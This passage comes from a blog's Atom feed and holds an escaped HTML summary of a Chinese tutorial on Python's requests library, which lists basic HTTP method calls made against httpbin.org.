href="http://www.cnblogs.com/lei0213/p/6957508.html" target="_blank" rel="noopener">更多的用法</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;一些请求方式&quot;&gt;&lt;a href=&quot;#一些请求方式&quot; class=&quot;headerlink&quot; title=&quot;一些请求方式&quot;&gt;&lt;/a&gt;一些请求方式&lt;/h3&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;import requests&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;requests.post(&amp;quot;http://httpbin.org/post&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;requests.put(&amp;quot;http://httpbin.org/put&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;requests.delete(&amp;quot;http://httpbin.org/delete&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;requests.head(&amp;quot;http://httpbin.org/get&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;requests.options(&amp;quot;http://httpbin.org/get&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
    
  </entry>
  
</feed>
